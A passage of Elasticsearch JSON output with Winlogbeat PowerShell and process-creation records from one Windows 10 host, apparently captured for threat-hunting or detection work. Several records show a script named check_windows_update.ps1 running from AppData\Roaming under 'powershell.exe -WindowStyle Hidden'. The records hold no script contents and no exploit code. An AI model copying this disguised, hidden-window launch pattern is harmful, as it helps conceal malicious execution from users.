        },
        {
          "_index": "winlogbeat-9.1.2",
          "_id": "lk7xDJoBUQc08OI1jwMa",
          "_score": null,
          "_ignored": [
            "winlog.event_data.param3.keyword"
          ],
          "_source": {
            "tags": [
              "beats_input_codec_plain_applied"
            ],
            "winlog": {
              "provider_name": "PowerShell",
              "computer_name": "DESKTOP-48ASLS3",
              "keywords": [
                "Classic"
              ],
              "channel": "Windows PowerShell",
              "record_id": 2193,
              "event_id": "600",
              "opcode": "Info",
              "event_data": {
                "param2": "Started",
                "param3": """	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.6456
	HostId=5ad62b57-4b66-4e94-832e-310756c9e3e3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -File C:\Users\konoha\AppData\Roaming\check_windows_update.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=""",
                "param1": "Function"
              }
            },
            "event": {
              "created": "2025-10-22T17:22:20.836Z",
              "code": "600",
              "kind": "event",
              "provider": "PowerShell"
            },
            "agent": {
              "version": "9.1.2",
              "name": "DESKTOP-48ASLS3",
              "id": "b9ca19fd-2ebb-4d9b-8451-77ab948619b0",
              "type": "winlogbeat",
              "ephemeral_id": "ce18a4b4-9459-4943-bda8-1823b9bbb362"
            },
            "log": {
              "level": "information"
            },
            "@version": "1",
            "host": {
              "hostname": "DESKTOP-48ASLS3",
              "ip": [
                "fe80::7885:d3a2:905b:4597",
                "192.168.89.133"
              ],
              "name": "desktop-48asls3",
              "mac": [
                "00-0C-29-DE-2F-B8"
              ],
              "architecture": "x86_64",
              "id": "681a4ddb-9712-4c88-b038-3cfc4aa5a83b",
              "os": {
                "build": "19045.6456",
                "platform": "windows",
                "family": "windows",
                "version": "10.0",
                "name": "Windows 10 Education",
                "type": "windows",
                "kernel": "10.0.19041.6456 (WinBuild.160101.0800)"
              }
            },
            "@timestamp": "2025-10-22T17:22:19.997Z",
            "ecs": {
              "version": "8.0.0"
            }
          },
          "sort": [
            "2025-10-22T17:22:19.997Z",
            197
          ]
        },
        {
          "_index": "winlogbeat-9.1.2",
          "_id": "lU7xDJoBUQc08OI1jwMa",
          "_score": null,
          "_ignored": [
            "winlog.event_data.param3.keyword"
          ],
          "_source": {
            "tags": [
              "beats_input_codec_plain_applied"
            ],
            "log": {
              "level": "information"
            },
            "event": {
              "created": "2025-10-22T17:22:20.836Z",
              "code": "600",
              "kind": "event",
              "provider": "PowerShell"
            },
            "agent": {
              "name": "DESKTOP-48ASLS3",
              "version": "9.1.2",
              "id": "b9ca19fd-2ebb-4d9b-8451-77ab948619b0",
              "type": "winlogbeat",
              "ephemeral_id": "ce18a4b4-9459-4943-bda8-1823b9bbb362"
            },
            "winlog": {
              "provider_name": "PowerShell",
              "computer_name": "DESKTOP-48ASLS3",
              "keywords": [
                "Classic"
              ],
              "channel": "Windows PowerShell",
              "event_id": "600",
              "record_id": 2191,
              "opcode": "Info",
              "event_data": {
                "param2": "Started",
                "param3": """	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.6456
	HostId=5ad62b57-4b66-4e94-832e-310756c9e3e3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -File C:\Users\konoha\AppData\Roaming\check_windows_update.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=""",
                "param1": "Environment"
              }
            },
            "@version": "1",
            "host": {
              "hostname": "DESKTOP-48ASLS3",
              "ip": [
                "fe80::7885:d3a2:905b:4597",
                "192.168.89.133"
              ],
              "name": "desktop-48asls3",
              "id": "681a4ddb-9712-4c88-b038-3cfc4aa5a83b",
              "architecture": "x86_64",
              "mac": [
                "00-0C-29-DE-2F-B8"
              ],
              "os": {
                "platform": "windows",
                "build": "19045.6456",
                "family": "windows",
                "version": "10.0",
                "name": "Windows 10 Education",
                "type": "windows",
                "kernel": "10.0.19041.6456 (WinBuild.160101.0800)"
              }
            },
            "@timestamp": "2025-10-22T17:22:19.997Z",
            "ecs": {
              "version": "8.0.0"
            }
          },
          "sort": [
            "2025-10-22T17:22:19.997Z",
            196
          ]
        },
        {
          "_index": "winlogbeat-9.1.2",
          "_id": "lE7xDJoBUQc08OI1jwMa",
          "_score": null,
          "_ignored": [
            "winlog.event_data.param3.keyword"
          ],
          "_source": {
            "tags": [
              "beats_input_codec_plain_applied"
            ],
            "winlog": {
              "provider_name": "PowerShell",
              "computer_name": "DESKTOP-48ASLS3",
              "event_id": "600",
              "channel": "Windows PowerShell",
              "record_id": 2189,
              "keywords": [
                "Classic"
              ],
              "opcode": "Info",
              "event_data": {
                "param2": "Started",
                "param3": """	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.6456
	HostId=5ad62b57-4b66-4e94-832e-310756c9e3e3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -File C:\Users\konoha\AppData\Roaming\check_windows_update.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=""",
                "param1": "Registry"
              },
              "error": {}
            },
            "agent": {
              "name": "DESKTOP-48ASLS3",
              "version": "9.1.2",
              "id": "b9ca19fd-2ebb-4d9b-8451-77ab948619b0",
              "type": "winlogbeat",
              "ephemeral_id": "ce18a4b4-9459-4943-bda8-1823b9bbb362"
            },
            "@version": "1",
            "@timestamp": "2025-10-22T17:22:19.997Z",
            "error": {
              "message": "failed to load publisher metadata for PowerShell (returning an empty metadata store): failed to get task array length: The resource loader failed to find MUI file."
            },
            "log": {
              "level": "information"
            },
            "event": {
              "created": "2025-10-22T17:22:20.836Z",
              "code": "600",
              "kind": "event",
              "provider": "PowerShell"
            },
            "host": {
              "hostname": "DESKTOP-48ASLS3",
              "ip": [
                "fe80::7885:d3a2:905b:4597",
                "192.168.89.133"
              ],
              "name": "desktop-48asls3",
              "mac": [
                "00-0C-29-DE-2F-B8"
              ],
              "architecture": "x86_64",
              "id": "681a4ddb-9712-4c88-b038-3cfc4aa5a83b",
              "os": {
                "build": "19045.6456",
                "platform": "windows",
                "family": "windows",
                "version": "10.0",
                "name": "Windows 10 Education",
                "type": "windows",
                "kernel": "10.0.19041.6456 (WinBuild.160101.0800)"
              }
            },
            "ecs": {
              "version": "8.0.0"
            }
          },
          "sort": [
            "2025-10-22T17:22:19.997Z",
            195
          ]
        },
        {
          "_index": "winlogbeat-9.1.2",
          "_id": "b07xDJoBUQc08OI1jwMY",
          "_score": null,
          "_ignored": [
            "winlog.event_data.param3.keyword"
          ],
          "_source": {
            "tags": [
              "beats_input_codec_plain_applied"
            ],
            "winlog": {
              "provider_name": "PowerShell",
              "computer_name": "DESKTOP-48ASLS3",
              "event_id": "600",
              "channel": "Windows PowerShell",
              "record_id": 2194,
              "keywords": [
                "Classic"
              ],
              "opcode": "Info",
              "event_data": {
                "param2": "Started",
                "param3": """	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.6456
	HostId=5ad62b57-4b66-4e94-832e-310756c9e3e3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -File C:\Users\konoha\AppData\Roaming\check_windows_update.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=""",
                "param1": "Variable"
              }
            },
            "event": {
              "created": "2025-10-22T17:22:20.836Z",
              "code": "600",
              "kind": "event",
              "provider": "PowerShell"
            },
            "agent": {
              "name": "DESKTOP-48ASLS3",
              "version": "9.1.2",
              "id": "b9ca19fd-2ebb-4d9b-8451-77ab948619b0",
              "ephemeral_id": "ce18a4b4-9459-4943-bda8-1823b9bbb362",
              "type": "winlogbeat"
            },
            "log": {
              "level": "information"
            },
            "@version": "1",
            "host": {
              "hostname": "DESKTOP-48ASLS3",
              "ip": [
                "fe80::7885:d3a2:905b:4597",
                "192.168.89.133"
              ],
              "name": "desktop-48asls3",
              "id": "681a4ddb-9712-4c88-b038-3cfc4aa5a83b",
              "mac": [
                "00-0C-29-DE-2F-B8"
              ],
              "architecture": "x86_64",
              "os": {
                "build": "19045.6456",
                "platform": "windows",
                "family": "windows",
                "version": "10.0",
                "name": "Windows 10 Education",
                "type": "windows",
                "kernel": "10.0.19041.6456 (WinBuild.160101.0800)"
              }
            },
            "@timestamp": "2025-10-22T17:22:19.997Z",
            "ecs": {
              "version": "8.0.0"
            }
          },
          "sort": [
            "2025-10-22T17:22:19.997Z",
            86
          ]
        },
        {
          "_index": "winlogbeat-9.1.2",
          "_id": "bk7xDJoBUQc08OI1jwMY",
          "_score": null,
          "_ignored": [
            "winlog.event_data.param3.keyword"
          ],
          "_source": {
            "tags": [
              "beats_input_codec_plain_applied"
            ],
            "log": {
              "level": "information"
            },
            "event": {
              "created": "2025-10-22T17:22:20.836Z",
              "code": "600",
              "kind": "event",
              "provider": "PowerShell"
            },
            "agent": {
              "version": "9.1.2",
              "name": "DESKTOP-48ASLS3",
              "id": "b9ca19fd-2ebb-4d9b-8451-77ab948619b0",
              "type": "winlogbeat",
              "ephemeral_id": "ce18a4b4-9459-4943-bda8-1823b9bbb362"
            },
            "winlog": {
              "provider_name": "PowerShell",
              "computer_name": "DESKTOP-48ASLS3",
              "keywords": [
                "Classic"
              ],
              "channel": "Windows PowerShell",
              "record_id": 2192,
              "event_id": "600",
              "opcode": "Info",
              "event_data": {
                "param2": "Started",
                "param3": """	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.6456
	HostId=5ad62b57-4b66-4e94-832e-310756c9e3e3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -File C:\Users\konoha\AppData\Roaming\check_windows_update.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=""",
                "param1": "FileSystem"
              }
            },
            "@version": "1",
            "host": {
              "hostname": "DESKTOP-48ASLS3",
              "ip": [
                "fe80::7885:d3a2:905b:4597",
                "192.168.89.133"
              ],
              "name": "desktop-48asls3",
              "id": "681a4ddb-9712-4c88-b038-3cfc4aa5a83b",
              "mac": [
                "00-0C-29-DE-2F-B8"
              ],
              "architecture": "x86_64",
              "os": {
                "platform": "windows",
                "build": "19045.6456",
                "family": "windows",
                "version": "10.0",
                "name": "Windows 10 Education",
                "type": "windows",
                "kernel": "10.0.19041.6456 (WinBuild.160101.0800)"
              }
            },
            "@timestamp": "2025-10-22T17:22:19.997Z",
            "ecs": {
              "version": "8.0.0"
            }
          },
          "sort": [
            "2025-10-22T17:22:19.997Z",
            85
          ]
        },
        {
          "_index": "winlogbeat-9.1.2",
          "_id": "bU7xDJoBUQc08OI1jwMY",
          "_score": null,
          "_ignored": [
            "winlog.event_data.param3.keyword"
          ],
          "_source": {
            "tags": [
              "beats_input_codec_plain_applied"
            ],
            "log": {
              "level": "information"
            },
            "event": {
              "created": "2025-10-22T17:22:20.836Z",
              "code": "600",
              "kind": "event",
              "provider": "PowerShell"
            },
            "agent": {
              "name": "DESKTOP-48ASLS3",
              "version": "9.1.2",
              "id": "b9ca19fd-2ebb-4d9b-8451-77ab948619b0",
              "type": "winlogbeat",
              "ephemeral_id": "ce18a4b4-9459-4943-bda8-1823b9bbb362"
            },
            "winlog": {
              "provider_name": "PowerShell",
              "computer_name": "DESKTOP-48ASLS3",
              "event_id": "600",
              "channel": "Windows PowerShell",
              "keywords": [
                "Classic"
              ],
              "record_id": 2190,
              "opcode": "Info",
              "event_data": {
                "param2": "Started",
                "param3": """	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.6456
	HostId=5ad62b57-4b66-4e94-832e-310756c9e3e3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -File C:\Users\konoha\AppData\Roaming\check_windows_update.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=""",
                "param1": "Alias"
              }
            },
            "@version": "1",
            "host": {
              "hostname": "DESKTOP-48ASLS3",
              "ip": [
                "fe80::7885:d3a2:905b:4597",
                "192.168.89.133"
              ],
              "name": "desktop-48asls3",
              "mac": [
                "00-0C-29-DE-2F-B8"
              ],
              "architecture": "x86_64",
              "id": "681a4ddb-9712-4c88-b038-3cfc4aa5a83b",
              "os": {
                "build": "19045.6456",
                "platform": "windows",
                "family": "windows",
                "version": "10.0",
                "name": "Windows 10 Education",
                "type": "windows",
                "kernel": "10.0.19041.6456 (WinBuild.160101.0800)"
              }
            },
            "@timestamp": "2025-10-22T17:22:19.997Z",
            "ecs": {
              "version": "8.0.0"
            }
          },
          "sort": [
            "2025-10-22T17:22:19.997Z",
            84
          ]
        },
        {
          "_index": "winlogbeat-9.1.2",
          "_id": "bE7xDJoBUQc08OI1jwMY",
          "_score": null,
          "_ignored": [
            "event.original.keyword",
            "message.keyword"
          ],
          "_source": {
            "tags": [
              "beats_input_codec_plain_applied"
            ],
            "winlog": {
              "event_id": "4688",
              "process": {
                "thread": {
                  "id": 8268
                },
                "pid": 4
              },
              "opcode": "Info",
              "task": "Process Creation",
              "provider_name": "Microsoft-Windows-Security-Auditing",
              "computer_name": "DESKTOP-48ASLS3",
              "provider_guid": "{54849625-5478-4994-A5BA-3E3B0328C30D}",
              "keywords": [
                "Audit Success"
              ],
              "record_id": 77684,
              "version": 2,
              "channel": "Security",
              "event_data": {
                "TargetDomainName": "-",
                "TokenElevationType": "TokenElevationTypeLimited (3)",
                "ParentProcessName": """C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""",
                "SubjectDomainName": "DESKTOP-48ASLS3",
                "NewProcessName": """C:\Windows\System32\conhost.exe""",
                "TargetLogonId": "0x0",
                "TargetUserSid": "S-1-0-0",
                "TargetUserName": "-",
                "SubjectUserSid": "S-1-5-21-2565546577-2149564376-132263907-1000",
                "ProcessId": "0x2044",
                "MandatoryLabel": "S-1-16-8192",
                "SubjectUserName": "konoha",
                "SubjectLogonId": "0x28f38",
                "NewProcessId": "0x206c"
              }
            },
            "event": {
              "action": "Process Creation",
              "created": "2025-10-22T17:22:20.682Z",
              "kind": "event",
              "code": "4688",
              "outcome": "success",
              "provider": "Microsoft-Windows-Security-Auditing"
            },
            "agent": {
              "name": "DESKTOP-48ASLS3",
              "version": "9.1.2",
              "id": "b9ca19fd-2ebb-4d9b-8451-77ab948619b0",
              "type": "winlogbeat",
              "ephemeral_id": "ce18a4b4-9459-4943-bda8-1823b9bbb362"
            },
            "log": {
              "level": "information"
            },
            "@version": "1",
            "host": {
              "hostname": "DESKTOP-48ASLS3",
              "ip": [
                "fe80::7885:d3a2:905b:4597",
                "192.168.89.133"
              ],
              "name": "desktop-48asls3",
              "mac": [
                "00-0C-29-DE-2F-B8"
              ],
              "architecture": "x86_64",
              "id": "681a4ddb-9712-4c88-b038-3cfc4aa5a83b",
              "os": {
                "build": "19045.6456",
                "platform": "windows",
                "family": "windows",
                "version": "10.0",
                "name": "Windows 10 Education",
                "type": "windows",
                "kernel": "10.0.19041.6456 (WinBuild.160101.0800)"
              }
            },
            "@timestamp": "2025-10-22T17:22:19.439Z",
            "ecs": {
              "version": "8.0.0"
            }
          },
          "sort": [
            "2025-10-22T17:22:19.439Z",
            83
          ]
        },
        {
          "_index": "winlogbeat-9.1.2",
          "_id": "k07xDJoBUQc08OI1jwMa",
          "_score": null,
          "_ignored": [
            "event.original.keyword",
            "message.keyword"
          ],
          "_source": {
            "tags": [
              "beats_input_codec_plain_applied"
            ],
            "winlog": {
              "event_id": "4688",
              "process": {
                "thread": {
                  "id": 5924
                },
                "pid": 4
              },
              "opcode": "Info",
              "task": "Process Creation",
              "provider_name": "Microsoft-Windows-Security-Auditing",
              "computer_name": "DESKTOP-48ASLS3",
              "keywords": [
                "Audit Success"
              ],
              "channel": "Security",
              "provider_guid": "{54849625-5478-4994-A5BA-3E3B0328C30D}",
              "version": 2,
              "record_id": 77683,
              "event_data": {
                "NewProcessId": "0x2044",
                "TokenElevationType": "TokenElevationTypeLimited (3)",
                "ParentProcessName": """C:\Windows\explorer.exe""",
                "SubjectDomainName": "DESKTOP-48ASLS3",
                "NewProcessName": """C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""",
                "TargetLogonId": "0x0",
                "TargetUserSid": "S-1-0-0",
                "TargetUserName": "-",
                "SubjectUserSid": "S-1-5-21-2565546577-2149564376-132263907-1000",
                "ProcessId": "0x1790",
                "SubjectUserName": "konoha",
                "MandatoryLabel": "S-1-16-8192",
                "TargetDomainName": "-",
                "SubjectLogonId": "0x28f38"
              }
            },
            "event": {
              "created": "2025-10-22T17:22:20.682Z",
              "action": "Process Creation",
              "kind": "event",
              "code": "4688",
              "outcome": "success",
              "provider": "Microsoft-Windows-Security-Auditing"
            },
            "agent": {
              "name": "DESKTOP-48ASLS3",
              "version": "9.1.2",
              "id": "b9ca19fd-2ebb-4d9b-8451-77ab948619b0",
              "type": "winlogbeat",
              "ephemeral_id": "ce18a4b4-9459-4943-bda8-1823b9bbb362"
            },
            "log": {
              "level": "information"
            },
            "@version": "1",
            "host": {
              "hostname": "DESKTOP-48ASLS3",
              "ip": [
                "fe80::7885:d3a2:905b:4597",
                "192.168.89.133"
              ],
              "name": "desktop-48asls3",
              "id": "681a4ddb-9712-4c88-b038-3cfc4aa5a83b",
              "mac": [
                "00-0C-29-DE-2F-B8"
              ],
              "architecture": "x86_64",
              "os": {
                "build": "19045.6456",
                "platform": "windows",
                "family": "windows",
                "version": "10.0",
                "name": "Windows 10 Education",
                "type": "windows",
                "kernel": "10.0.19041.6456 (WinBuild.160101.0800)"
              }
            },
            "@timestamp": "2025-10-22T17:22:19.339Z",
            "ecs": {
              "version": "8.0.0"
            }
          },
          "sort": [
            "2025-10-22T17:22:19.339Z",
            194
          ]
        },
        {
          "_index": "winlogbeat-9.1.2",
          "_id": "a07xDJoBUQc08OI1jwMY",
          "_score": null,
          "_ignored": [
            "event.original.keyword",
            "message.keyword"
          ],
          "_source": {
            "tags": [
              "beats_input_codec_plain_applied"
            ],
            "winlog": {
              "event_id": "4689",
              "process": {
                "thread": {
                  "id": 5924
                },
                "pid": 4
              },
              "opcode": "Info",
              "task": "Process Termination",
              "provider_name": "Microsoft-Windows-Security-Auditing",
              "computer_name": "DESKTOP-48ASLS3",
              "keywords": [
                "Audit Success"
              ],
              "channel": "Security",
              "provider_guid": "{54849625-5478-4994-A5BA-3E3B0328C30D}",
              "record_id": 77682,
              "event_data": {
                "SubjectUserSid": "S-1-5-21-2565546577-2149564376-132263907-1000",
                "ProcessId": "0x1d88",
                "SubjectDomainName": "DESKTOP-48ASLS3",
                "Status": "0x0",
                "ProcessName": """C:\Windows\System32\mobsync.exe""",
                "SubjectUserName": "konoha",
                "SubjectLogonId": "0x28f38"
              }
            },
            "event": {
              "created": "2025-10-22T17:22:20.681Z",
              "provider": "Microsoft-Windows-Security-Auditing",
              "kind": "event",
              "code": "4689",
              "outcome": "success",
              "action": "Process Termination"
            },
            "agent": {
              "name": "DESKTOP-48ASLS3",
              "version": "9.1.2",
              "id": "b9ca19fd-2ebb-4d9b-8451-77ab948619b0",
              "type": "winlogbeat",
              "ephemeral_id": "ce18a4b4-9459-4943-bda8-1823b9bbb362"
            },
            "log": {
              "level": "information"
            },
            "@version": "1",
            "host": {
              "hostname": "DESKTOP-48ASLS3",
              "ip": [
                "fe80::7885:d3a2:905b:4597",
                "192.168.89.133"
              ],
              "name": "desktop-48asls3",
              "mac": [
                "00-0C-29-DE-2F-B8"
              ],
              "architecture": "x86_64",
              "id": "681a4ddb-9712-4c88-b038-3cfc4aa5a83b",
              "os": {
                "build": "19045.6456",
                "platform": "windows",
                "family": "windows",
                "name": "Windows 10 Education",
                "version": "10.0",
                "type": "windows",
                "kernel": "10.0.19041.6456 (WinBuild.160101.0800)"
              }
            },
            "@timestamp": "2025-10-22T17:22:19.331Z",
            "ecs": {
              "version": "8.0.0"
            }
          },
          "sort": [
            "2025-10-22T17:22:19.331Z",
            82
          ]
        },
